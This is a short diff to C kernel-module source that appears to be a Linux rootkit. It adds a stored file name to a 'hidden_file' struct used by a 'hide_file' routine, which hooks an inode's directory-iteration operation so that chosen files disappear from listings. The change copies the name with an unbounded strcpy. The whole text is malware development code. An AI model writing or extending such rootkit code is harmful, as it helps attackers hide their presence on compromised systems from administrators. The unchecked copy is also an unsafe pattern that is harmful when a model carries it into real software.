@@ -74,6 +74,7 @@ struct hidden_file {
     struct inode* inode;
     struct dir_context* backup_ctx;
     struct dir_context* bad_ctx;
+    char name[PATH_MAX];
 };
 static struct hidden_file hidden_files[256];
 int hidden_file_count = 0;
@@ -665,6 +666,8 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
     hf->backup_fops = hf->inode->i_fop;
     hf->fops.iterate_shared = rk_iterate_shared;
     hf->inode->i_fop = &hf->fops;
+
+    strcpy(hf->name, user_file);
 
     kfree(user_dir);
     kfree(user_file);
